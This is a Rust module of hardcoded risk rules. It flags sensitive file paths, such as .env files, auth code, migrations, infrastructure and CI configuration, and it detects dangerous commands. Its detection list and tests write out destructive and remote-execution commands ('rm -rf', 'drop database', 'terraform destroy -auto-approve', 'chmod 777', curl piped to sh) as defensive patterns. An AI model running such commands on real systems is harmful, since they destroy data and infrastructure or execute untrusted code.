//! Hardcoded V1 path and command risk rules (mirrors default policy examples).

use super::model::RiskLevel;

#[derive(Debug, Clone, Copy)]
pub struct PathHit {
    pub category: &'static str,
    pub severity: RiskLevel,
    pub message: &'static str,
    pub evidence_note: Option<&'static str>,
}

/// Normalize path for matching: lowercase, backslash → slash, strip leading `./`.
pub fn normalize_path(path: &str) -> String {
    let mut p = path.replace('\\', "/").to_lowercase();
    while p.starts_with("./") {
        p = p[2..].to_string();
    }
    p
}

fn basename(norm: &str) -> &str {
    norm.rsplit('/').next().unwrap_or(norm)
}

fn path_segments(norm: &str) -> impl Iterator<Item = &str> {
    norm.split('/').filter(|s| !s.is_empty())
}

/// Return the highest-severity path hit for a single path, if any.
pub fn match_path(path: &str) -> Option<PathHit> {
    let norm = normalize_path(path);
    let base = basename(&norm);

    // Critical: secrets / env
    if base == ".env" || base.starts_with(".env.") {
        return Some(PathHit {
            category: "secret_access",
            severity: RiskLevel::Critical,
            message: "Secret/config file modified.",
            evidence_note: None,
        });
    }
    if path_segments(&norm).any(|s| s.contains("secrets") || s.contains("credentials"))
        || base.contains("secrets")
        || base.contains("credentials")
    {
        return Some(PathHit {
            category: "secret_access",
            severity: RiskLevel::Critical,
            message: "Secret/config file modified.",
            evidence_note: None,
        });
    }

    // High: auth / middleware
    if path_segments(&norm).any(|s| s == "auth")
        || base.starts_with("auth")
        || base.contains("session") && (base.ends_with(".ts") || base.ends_with(".js") || base.ends_with(".rs") || base.ends_with(".py"))
    {
        // Prefer explicit auth segment; session alone is weak — only if under auth-ish names
        if path_segments(&norm).any(|s| s == "auth") || base.contains("auth") {
            return Some(PathHit {
                category: "auth_change",
                severity: RiskLevel::High,
                message: "Auth-sensitive file changed.",
                evidence_note: Some("Evidence not yet evaluated."),
            });
        }
    }
    if path_segments(&norm).any(|s| s == "middleware") || base.contains("middleware") {
        return Some(PathHit {
            category: "auth_change",
            severity: RiskLevel::High,
            message: "Auth-sensitive middleware/file changed.",
            evidence_note: Some("Evidence not yet evaluated."),
        });
    }

    // High: migrations
    if path_segments(&norm).any(|s| s == "migrations" || s == "migration") {
        return Some(PathHit {
            category: "database_migration",
            severity: RiskLevel::High,
            message: "Database migration path changed.",
            evidence_note: None,
        });
    }

    // High: infra / CI prefixes
    if norm.starts_with("terraform/") || path_segments(&norm).any(|s| s == "terraform") {
        return Some(PathHit {
            category: "infra_change",
            severity: RiskLevel::High,
            message: "Infrastructure (Terraform) path changed.",
            evidence_note: None,
        });
    }
    if norm.starts_with("k8s/") || path_segments(&norm).any(|s| s == "k8s" || s == "kubernetes") {
        return Some(PathHit {
            category: "infra_change",
            severity: RiskLevel::High,
            message: "Infrastructure (Kubernetes) path changed.",
            evidence_note: None,
        });
    }
    if norm.starts_with(".github/workflows/") {
        return Some(PathHit {
            category: "ci_change",
            severity: RiskLevel::High,
            message: "CI workflow file changed.",
            evidence_note: None,
        });
    }

    // Medium: lockfiles / docker
    if matches!(
        base,
        "package-lock.json" | "pnpm-lock.yaml" | "yarn.lock"
    ) {
        return Some(PathHit {
            category: "dependency_change",
            severity: RiskLevel::Medium,
            message: "Dependency lockfile modified.",
            evidence_note: None,
        });
    }
    if base == "dockerfile" || base == "docker-compose.yml" || base == "docker-compose.yaml" {
        return Some(PathHit {
            category: "infra_change",
            severity: RiskLevel::Medium,
            message: "Container/infra definition modified.",
            evidence_note: None,
        });
    }

    // Simpler auth catch: path contains /auth/
    if norm.contains("/auth/") || norm.starts_with("auth/") {
        return Some(PathHit {
            category: "auth_change",
            severity: RiskLevel::High,
            message: "Auth-sensitive file changed.",
            evidence_note: Some("Evidence not yet evaluated."),
        });
    }

    None
}

#[derive(Debug, Clone, Copy)]
pub struct CommandHit {
    pub category: &'static str,
    pub severity: RiskLevel,
    pub message: &'static str,
}

/// Match dangerous patterns in a command line (case-insensitive).
pub fn match_command(command: &str) -> Vec<CommandHit> {
    let lower = command.to_lowercase();
    let mut hits = Vec::new();

    let rules: &[(&str, CommandHit)] = &[
        (
            "rm -rf",
            CommandHit {
                category: "dangerous_command",
                severity: RiskLevel::Critical,
                message: "Dangerous command pattern detected (rm -rf).",
            },
        ),
        (
            "drop database",
            CommandHit {
                category: "dangerous_command",
                severity: RiskLevel::Critical,
                message: "Dangerous command pattern detected (drop database).",
            },
        ),
        (
            "kubectl delete",
            CommandHit {
                category: "dangerous_command",
                severity: RiskLevel::Critical,
                message: "Dangerous command pattern detected (kubectl delete).",
            },
        ),
        (
            "terraform destroy",
            CommandHit {
                category: "dangerous_command",
                severity: RiskLevel::Critical,
                message: "Dangerous command pattern detected (terraform destroy).",
            },
        ),
        (
            "chmod 777",
            CommandHit {
                category: "permission_widening",
                severity: RiskLevel::High,
                message: "Permission-widening command pattern detected (chmod 777).",
            },
        ),
    ];

    for (needle, hit) in rules {
        if lower.contains(needle) {
            hits.push(*hit);
        }
    }

    // curl ... | sh / bash
    if lower.contains("curl") && lower.contains('|') && (lower.contains("sh") || lower.contains("bash"))
    {
        hits.push(CommandHit {
            category: "dangerous_command",
            severity: RiskLevel::Critical,
            message: "Dangerous command pattern detected (curl piped to shell).",
        });
    }

    hits
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn env_is_critical() {
        let h = match_path(".env").unwrap();
        assert_eq!(h.severity, RiskLevel::Critical);
        assert_eq!(h.category, "secret_access");
    }

    #[test]
    fn env_local_is_critical() {
        let h = match_path("apps/web/.env.local").unwrap();
        assert_eq!(h.severity, RiskLevel::Critical);
    }

    #[test]
    fn auth_path_is_high_with_evidence_note() {
        let h = match_path("src/auth/session.ts").unwrap();
        assert_eq!(h.severity, RiskLevel::High);
        assert_eq!(h.category, "auth_change");
        assert!(h.evidence_note.is_some());
    }

    #[test]
    fn windows_path_auth() {
        let h = match_path(r"src\auth\session.ts").unwrap();
        assert_eq!(h.category, "auth_change");
    }

    #[test]
    fn lockfile_medium() {
        let h = match_path("package-lock.json").unwrap();
        assert_eq!(h.severity, RiskLevel::Medium);
    }

    #[test]
    fn safe_readme_none() {
        assert!(match_path("README.md").is_none());
    }

    #[test]
    fn terraform_destroy_command() {
        let hits = match_command("terraform destroy -auto-approve");
        assert!(hits.iter().any(|h| h.severity == RiskLevel::Critical));
    }

    #[test]
    fn curl_pipe_sh() {
        let hits = match_command("curl https://x | sh");
        assert!(hits.iter().any(|h| h.category == "dangerous_command"));
    }
}
